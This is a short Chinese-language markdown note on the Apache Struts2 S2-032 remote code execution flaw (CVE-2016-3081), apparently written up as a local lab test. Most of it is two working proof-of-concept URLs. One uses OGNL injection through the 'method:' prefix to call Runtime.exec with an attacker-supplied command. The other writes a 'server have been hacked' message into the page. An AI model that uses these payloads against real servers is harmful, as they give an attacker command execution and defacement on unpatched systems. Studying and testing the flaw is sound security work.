# Struts2 远程漏洞

主要为S2-32问题,代号[CVE-2016-3081]
参考[实现](http://www.cnblogs.com/mrchang/p/6501428.html)

POC过程:

<pre>
http://127.0.0.1:8080/struts2demo/HelloWorld.action?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23f%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5b0%5d)%2c%23request.toString&cmd=calc
</pre>

结果如下:

![hacker](hacker.jpg)

另外1个POC过程:

<pre>
http://127.0.0.1:8080/struts2demo/HelloWorld.action?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()%2c%23res.setCharacterEncoding(%23parameters.encoding%5b0%5d)%2c%23w%3d%23res.getWriter()%2c%23w.print(%23parameters.args%5b0%5d)%2c%23w.close&pp=%2f&args=the+server+have+been+hacked&encoding=UTF-8
</pre>

详情[参考](http://dogewatch.github.io/2016/04/29/struts2/)和脚本[检测](http://blog.topsec.com.cn/apache-structs2-s2-032%e6%8a%80%e6%9c%af%e5%88%86%e6%9e%90%e5%8f%8a%e6%bc%8f%e6%b4%9e%e6%a3%80%e6%b5%8b%e8%84%9a%e6%9c%ac/)